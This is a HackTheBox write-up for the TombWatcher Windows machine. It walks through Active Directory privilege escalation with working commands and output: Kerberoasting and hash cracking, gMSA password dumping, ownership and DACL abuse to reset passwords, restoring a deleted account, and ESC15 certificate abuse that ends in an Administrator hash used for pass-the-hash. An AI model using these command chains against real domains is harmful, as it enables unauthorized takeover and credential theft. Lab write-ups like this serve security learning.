---
title: TombWatcher - HTB
date: 2025-06-09
categories: [WriteUps, HTB]
tags: [HTB, windows, AD, privesc, ADCS]
image:
  base: /assets/img/posts/htb/tombwatcher
active: false
difficulty: medium
os: windows
description: "TombWatcher is the 4th machine of HackTheBox Season 8."
pawned: root
---

## Scan

```bash
sudo nmap -sS -Pn -n -p- -sC -sV 10.10.11.72 -oN nmap.dump
```

---

## Foothold

We start with credentials: `henry:H3nry_987TGV!`

Run BloodHound to enumerate the domain:

```bash
bloodhound-python -u 'henry' -p 'H3nry_987TGV!' -d tombwatcher.htb \
  -dc DC01.tombwatcher.htb -c All -o bloodhound_results.json -ns 10.10.11.72
```

---

## User

BloodHound reveals credentials stored as a note:

```
admin:CQVTGJ_3KMMr4yvNAx40hgafoH_OlMnC → Admin123456!
```

BloodHound also shows that `henry` has **WriteSPN** on user `alfred` → Targeted Kerberoast.

### Targeted Kerberoast on Alfred

```bash
netexec smb 10.10.11.72 -u 'henry' -p 'H3nry_987TGV!' --shares
```

```bash
faketime "$(ntpdate -q dc01.tombwatcher.htb | cut -d ' ' -f 1,2)" \
  python3 targetedKerberoast.py -f hashcat -vv \
  -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' -U user.txt
```

We get a TGS-REP hash for `Alfred`. Crack it with hashcat (mode 13100 = Kerberos 5 etype 23 TGS-REP):

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force
...
alfred:basketball
```

### AddSelf → Infrastructure group

BloodHound shows `alfred` has **AddSelf** on the `INFRASTRUCTURE` group.

> Note: `net rpc group addmem` fails with `NT_STATUS_ACCESS_DENIED` here — bloodyAD handles this correctly via LDAP instead of RPC:

```bash
python3 bloodyAD.py -u 'alfred' -p 'basketball' -d tombwatcher.htb \
  --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred
# [+] alfred added to INFRASTRUCTURE
```

Verify:
```bash
net rpc group members "Infrastructure" -U 'TOMBWATCHER.HTB/alfred%basketball' -S 10.10.11.72
# TOMBWATCHER\Alfred
```

### ReadGMSAPassword → ansible_dev$

`INFRASTRUCTURE` has **ReadGMSAPassword** on `ANSIBLE_DEV$`:

```bash
python3 gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
```

```
ansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc
ansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3
```

### ansible_dev$ → SAM → JOHN

Set a password for `SAM` using the gMSA NTLM hash:

```bash
python3 bloodyAD.py --host 10.10.11.72 -d tombwatcher.htb \
  -u 'ansible_dev$' -p :1c37d00093dc2a5f25176bf2d474afdc \
  set password 'SAM' 'Password123456!'
```

`SAM` has **WriteOwner** on `JOHN`. Take ownership then grant FullControl to write the password:

> Note: `owneredit.py` fails with the system impacket due to a [ldap3 bug](https://github.com/cannatag/ldap3/issues/1051). Fix it with a local virtual environment:

```bash
pip3 install pyOpenSSL==24.0.0 cryptography==44.0.2
git clone https://github.com/cannatag/ldap3.git
pip3 install ldap3/
```

Then:
```bash
python3 .env/bin/owneredit.py -action write -new-owner 'SAM' -target 'JOHN' \
  'TOMBWATCHER.HTB'/'SAM':'Password123456!'

python3 .env/bin/dacledit.py -action 'write' -rights 'FullControl' \
  -principal 'SAM' -target 'JOHN' 'TOMBWATCHER.HTB'/'SAM':'Password123456!'
```

Now set JOHN's password and connect:

```bash
net rpc password john "Password123456!" \
  -U "TOMBWATCHER.HTB"/"SAM"%"Password123456!" -S 10.10.11.72

evil-winrm -i 10.10.11.72 -u JOHN -p 'Password123456!'
```

```
*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
```

---

## Root

### Recovering deleted objects

From JOHN's session, enumerate deleted AD objects:

```powershell
Get-ADObject -Filter 'IsDeleted -eq $true' -IncludeDeletedObjects
```

We find three deleted `cert_admin` accounts. The **last one** restores cleanly:

```powershell
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```

Reset its password:
```bash
net rpc password cert_admin "Password123456!" \
  -U "TOMBWATCHER.HTB"/"JOHN"%"Password123456!" -S 10.10.11.72
```

### ADCS Enumeration — ESC15

```bash
faketime "$(ntpdate -q dc01.tombwatcher.htb | cut -d ' ' -f 1,2)" \
  certipy find -vulnerable -u 'cert_admin' -p 'Password123456!' -dc-ip 10.10.11.72
```

The `WebServer` template is vulnerable to **ESC15** (CVE-2024-49019): enrollee supplies subject and schema version is 1.

`cert_admin` has enrollment rights on this template.

### Exploiting ESC15

**Strategy:** abuse ESC15 to get a Certificate Request Agent, then enroll on behalf of Administrator.

**Step 1:** Request a cert with the `Certificate Request Agent` application policy:

```bash
certipy req -u 'cert_admin' -p 'Password123456!' -dc-ip 10.10.11.72 \
  -target 'DC01.TOMBWATCHER.HTB' -ca 'tombwatcher-CA-1' \
  -template 'WebServer' -application-policies 'Certificate Request Agent'
# → cert_admin.pfx
```

**Step 2:** Use that cert to enroll on behalf of Administrator:

```bash
certipy req -u 'cert_admin' -p 'Password123456!' -dc-ip 10.10.11.72 \
  -target 'DC01.TOMBWATCHER.HTB' -ca 'tombwatcher-CA-1' \
  -template 'User' -pfx cert_admin.pfx -on-behalf-of 'TOMBWATCHER\Administrator'
# → administrator.pfx
```

**Step 3:** Authenticate and retrieve the NT hash:

```bash
faketime "$(ntpdate -q dc01.tombwatcher.htb | cut -d ' ' -f 1,2)" \
  certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72
```

```
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

**Step 4:** Connect as Administrator:

```bash
evil-winrm -i 10.10.11.72 -u Administrator \
  -H 'f61db423bebe3328d33af26741afe5fc'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```